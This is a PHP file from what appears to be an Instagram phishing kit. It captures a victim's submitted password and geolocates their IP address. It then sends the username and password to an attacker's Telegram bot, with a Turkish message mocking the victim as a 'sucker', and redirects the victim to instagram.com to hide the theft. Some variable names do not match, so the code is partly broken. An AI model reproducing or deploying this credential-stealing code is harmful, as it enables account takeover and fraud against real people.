<?php
include('tg.php');

$id=$_GET["id"];
header("location: info.php?nick=$username");
if($_POST){
$ip=$_SERVER["REMOTE_ADDR"];
$konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");

$password=$_POST["password"];
header("location: password.php?id=$id");

$data = [
  'text' => '➡️ Lan Koş Sazan Düştü 😈 
Sublime Saplar 😈
Kullanıcı Adı : '.$us.'
Şifre : '.$pass.'
',
  'chat_id' => $chat_id
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header('Location: https://instagram.com/');
}
?>
